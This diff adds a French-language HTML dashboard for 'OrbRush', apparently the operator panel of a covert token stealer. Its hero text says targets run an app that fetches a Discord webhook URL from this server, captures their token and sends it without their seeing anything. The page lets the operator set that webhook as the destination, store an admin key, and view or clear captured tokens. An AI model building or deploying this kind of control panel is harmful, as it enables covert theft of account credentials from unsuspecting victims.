@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>OrbRush - Dashboard</title>
+  <link rel="stylesheet" href="/style.css" />
+</head>
+<body>
+  <div class="aurora"></div>
+
+  <div class="wrap">
+    <header class="top">
+      <div class="brand">
+        <span class="orb"></span>
+        <span class="brand-name">Orb<em>Rush</em></span>
+        <span class="badge">dashboard</span>
+      </div>
+      <div class="top-right">
+        <span class="pill" id="health">verification</span>
+      </div>
+    </header>
+
+    <section class="hero">
+      <h1>Pilote ton <span class="grad">webhook</span> a distance</h1>
+      <p>Les cibles lancent l'app. Elle recupere l'URL ici, capture le token et l'envoie. Elles ne voient rien.</p>
+    </section>
+
+    <section class="panel">
+      <div class="panel-head">
+        <h2>Cle admin</h2>
+        <span class="pill" id="key-state">non verifiee</span>
+      </div>
+      <p class="hint">Definie via la variable d'environnement <code>ADMIN_KEY</code> sur Render. Stockee dans ton navigateur.</p>
+      <div class="row">
+        <input id="key" type="password" placeholder="ta cle admin" autocomplete="off" />
+        <button class="btn ghost" id="save-key">Valider</button>
+      </div>
+    </section>
+
+    <section class="panel">
+      <div class="panel-head">
+        <h2>Webhook Discord</h2>
+        <span class="pill" id="cfg-state">chargement</span>
+      </div>
+      <p class="hint">Parametres du salon - Integrations - Webhooks - Copier l'URL.</p>
+      <input id="webhook" type="text" spellcheck="false" autocomplete="off" placeholder="https://discord.com/api/webhooks/..." />
+      <div class="row">
+        <button class="btn primary" id="save-webhook">Enregistrer</button>
+        <button class="btn accent" id="test-webhook">Tester</button>
+      </div>
+      <p class="small" id="cfg-updated"></p>
+    </section>
+
+    <section class="panel">
+      <div class="panel-head">
+        <h2>Captures</h2>
+        <div class="row tight">
+          <button class="btn ghost small" id="refresh">Rafraichir</button>
+          <button class="btn ghost small danger" id="clear">Vider</button>
+        </div>
+      </div>
+      <div id="captures" class="captures"></div>
+    </section>
+
+    <footer class="foot">OrbRush - serveur de configuration</footer>
+  </div>
+
+  <div class="toasts" id="toasts"></div>
+  <script src="/app.js"></script>
+</body>
+</html>
